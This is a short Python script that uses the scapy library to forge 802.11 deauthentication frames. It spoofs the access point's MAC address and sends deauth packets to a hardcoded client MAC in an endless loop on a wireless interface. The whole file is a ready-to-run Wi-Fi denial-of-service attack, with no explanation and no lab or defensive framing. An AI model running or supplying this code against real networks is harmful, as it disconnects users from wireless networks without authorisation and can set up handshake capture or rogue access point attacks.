from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth


def disconnect(target_mac, gateway_mac):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.01, loop=1, iface="wlan1", verbose=1)


if __name__ == "__main__":
    target_mac = "32:22:e4:a2:d7:b4"
    gateway_mac = "7e:24:59:9b:e3:20"
    disconnect(target_mac, gateway_mac)
